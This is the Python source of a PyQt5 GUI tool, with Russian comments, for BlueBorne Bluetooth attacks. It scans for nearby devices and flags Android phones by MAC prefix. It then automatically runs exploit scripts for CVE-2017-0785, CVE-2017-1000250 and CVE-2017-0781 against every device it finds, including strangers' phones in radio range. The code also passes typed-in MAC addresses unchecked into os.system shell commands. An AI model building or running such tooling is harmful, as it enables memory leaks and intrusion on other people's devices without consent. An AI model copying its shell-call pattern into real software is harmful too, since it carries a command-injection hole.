import sys
import resources
# Импортируем наш интерфейс из файла
from scanner_gui import *
from CVE_2017_0785_gui import *
from CVE_2017_1000250__gui import *
from CVE_2017_0781_gui import *
from PyQt5 import QtCore, QtGui, QtWidgets
import time
import bluetooth
from classes.deviceslist import devices # подключаем класс deviceslist из модуля devices
import signal
import os
from array import *
from threading import Timer
import subprocess
import re



global vulns
global vulns_1000250

vulns = list()
vulns_1000250 = list()



class MyWin_CVE2(QtWidgets.QMainWindow):

    def __init__(self, parent=None):

        QtWidgets.QWidget.__init__(self, parent)
        self.second = Ui_MainWindow_CVE2()
        self.second.setupUi(self)
        self.second.attack_2.clicked.connect(self.attack_2)
        self.second.button_exit_2.clicked.connect(self.exit)



    def attack_2(self):

        mac_addr_2=self.second.text_mac_2.toPlainText()
        os.system("python3 blueborne_linux_infoleak_v2.py " + mac_addr_2+">res_250.txt")
        os.system("gedit res_250.txt")


    def exit(self):
        myapp_CVE2.close()



class MyWin_CVE(QtWidgets.QMainWindow):
    global vulns
    def __init__(self, parent=None):
        QtWidgets.QWidget.__init__(self, parent)
        self.second = Ui_MainWindow_CVE()
        self.second.setupUi(self)
        self.second.attack.clicked.connect(self.attack)
        self.second.button_exit.clicked.connect(self.exit)
        




    def attack(self):
        mac_addr=self.second.text_mac.toPlainText()
        os.system("python2 44555.py TARGET=" + mac_addr + ">res.txt")
        os.system("gedit res.txt")

    def exit(self):
        myapp_CVE.close()



class MyWin_CVE3(QtWidgets.QMainWindow):

    def __init__(self, parent=None):
        QtWidgets.QWidget.__init__(self, parent)
        self.second = Ui_MainWindow_CVE3()
        self.second.setupUi(self)
        self.second.attack_3.clicked.connect(self.attack_3)
        self.second.button_exit_3.clicked.connect(self.exit)

    def attack_3(self):

        mac_addr_3=self.second.text_mac_3.toPlainText()
        os.system("python2 CVE_2017_0781.py TARGET=" + mac_addr_3+">res_0781.txt")
        os.system("gedit res_0781.txt")



    def exit(self):
        myapp_CVE3.close()



class MyWin(QtWidgets.QMainWindow):

    global vulns



    def __init__(self, parent=None):
        QtWidgets.QWidget.__init__(self, parent)
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)



        # Здесь прописываем событие нажатия на кнопку        
        self.ui.start.clicked.connect(self.MyFunction)
        self.ui.start_2.clicked.connect(self.MyFunction_2)
        self.ui.exit.clicked.connect(self.fun_exit)
        self.ui.pushButton.clicked.connect(self.exploit)
        self.ui.pushButton_2.clicked.connect(self.exploit2)
        self.ui.pushButton_3.clicked.connect(self.exploit3)




    # Пока пустая функция которая выполняется
    # при нажатии на кнопку                  
    def MyFunction(self):
        global vulns
        global otv



        def text():
            self.ui.textEdit.clear()
            self.ui.textEdit_2.clear()
            self.ui.textEdit_3.clear()


        devicelookup = devices.get_devices() # вызываем функцию get_devices()  из класса devices



        def search():
            print("searching for devices")

            devices = bluetooth.discover_devices(duration=20, lookup_names=True) # найти список видимых устройств Bluetooth с их соответствующими деталями в диапазоне моего Bluetooth-модема
            return devices

        def is_device_vulnerable(addr): # функция определения уязвимости устройства
            manufacturers = devicelookup["ANDROIDS"]
            for manufacturer in manufacturers:
                lookups = manufacturers[manufacturer]
                for _ in lookups:
                    if _ == addr[:8]: # сравнивание найденного устройства с классом уязвимых устройств
                        return True
            return False


        text()
        results = search()
        schet=0
        if (results != None):
            for addr, name in results:
                schet=schet+1
                vulnerable = is_device_vulnerable(addr)
                vulns_1000250.append(addr)
                print(vulns_1000250)
                if vulnerable:
                    vulns.append(addr)
                print("{0}) {1} - {2} - {Уязвим}Уязвим".format(schet, addr, name,Уязвим = "!!!   " if vulnerable else "НЕ "))
                self.ui.textEdit.insertPlainText("{0}) {1} - {2} - {Уязвим}Уязвим\n".format(schet, addr, name,Уязвим="!!!  " if vulnerable else "НЕ "))
        print(vulns_1000250)
        #CVE_2017_0785()


        vulns
        if (vulns != None):

            for addr in vulns:
                mac_addr = addr

                os.system("python2 44555.py TARGET=" + mac_addr + ">res.txt")
                kol = len(re.findall(r"[\n']+?", open('res.txt').read()))
                global last_line
                with open('res.txt') as f:
                    for line in f:
                        pass
                    last_line = line
                print(last_line)

                if (kol > 60):
                    self.ui.textEdit_3.insertPlainText("{0} - Уязвим\n".format(mac_addr))

                elif (last_line == "BluetoothError: (112, 'Host is down')\n"):
                    self.ui.textEdit_3.insertPlainText("{0} - Ошибка: соединение разорвано\n".format(mac_addr))

                else:
                    self.ui.textEdit_3.insertPlainText("{0} - НЕ Уязвим\n".format(mac_addr))
                mac_addr=0
                last_line=0
            vulns.clear()

        #CVE_2017_1000250
        if (results != None):

            for addr in vulns_1000250:
                mac_addr_2=addr
                print(mac_addr_2)
                os.system("python3 blueborne_linux_infoleak_v2.py " + mac_addr_2+">res_250.txt")
                last_line
                with open('res_250.txt') as f:
                    for line in f:
                        pass
                    last_line = line
                print(last_line)
                if(last_line=="Данное устройство не уязвимо этой атаке\n" ):
                    self.ui.textEdit_2.insertPlainText("{0} - НЕ Уязвим\n".format(mac_addr_2))
                elif(last_line=="Ошибка: соединение разорвано\n"):
                    self.ui.textEdit_2.insertPlainText("{0} - Ошибка: соединение разорвано\n".format(mac_addr_2))
                else:
                    self.ui.textEdit_2.insertPlainText("{0} - Уязвим\n".format(mac_addr_2))
                last_line=0
                mac_addr_2=0
            vulns_1000250.clear()

    def MyFunction_2(self):

        def text():
            self.ui.textEdit.clear()
            self.ui.textEdit_2.clear()
            self.ui.textEdit_3.clear()

        devicelookup = devices.get_devices()  # вызываем функцию get_devices()  из класса devices

        def search():
            print("searching for devices")

            devices = bluetooth.discover_devices(duration=20, lookup_names=True)  # найти список видимых устройств Bluetooth с их соответствующими деталями в диапазоне моего Bluetooth-модема
            return devices

        def is_device_vulnerable(addr):  # функция определения уязвимости устройства
            manufacturers = devicelookup["ANDROIDS"]
            for manufacturer in manufacturers:
                lookups = manufacturers[manufacturer]
                for _ in lookups:
                    if _ == addr[:8]:  # сравнивание найденного устройства с классом уязвимых устройств
                        return True
            return False

        text()
        results = search()
        schet = 0
        if (results != None):
            for addr, name in results:
                schet = schet + 1
                vulnerable = is_device_vulnerable(addr)
                if vulnerable:
                    vulns.append(addr)
                print("{0}) {1} - {2} - {Уязвим}Уязвим".format(schet, addr, name, Уязвим="!!!   " if vulnerable else "НЕ "))
                self.ui.textEdit.insertPlainText("{0}) {1} - {2} - {Уязвим}Уязвим\n".format(schet, addr, name, Уязвим="!!!  " if vulnerable else "НЕ "))






    def fun_exit(self):
        signal.signal(signal.SIGINT, signal.SIG_DFL)
        exit(0)
        #macaddr="98:D6:F7:75:46:44" B4:9C:DF:23:82:0D

    def exploit(self):
        myapp_CVE.show()

    def exploit2(self):
        myapp_CVE2.show()

    def exploit3(self):
        myapp_CVE3.show()






if __name__=="__main__":
    app = QtWidgets.QApplication(sys.argv)
    myapp = MyWin()
    myapp_CVE=MyWin_CVE()
    myapp_CVE2=MyWin_CVE2()
    myapp_CVE3=MyWin_CVE3()
    myapp.show()



    sys.exit(app.exec_())
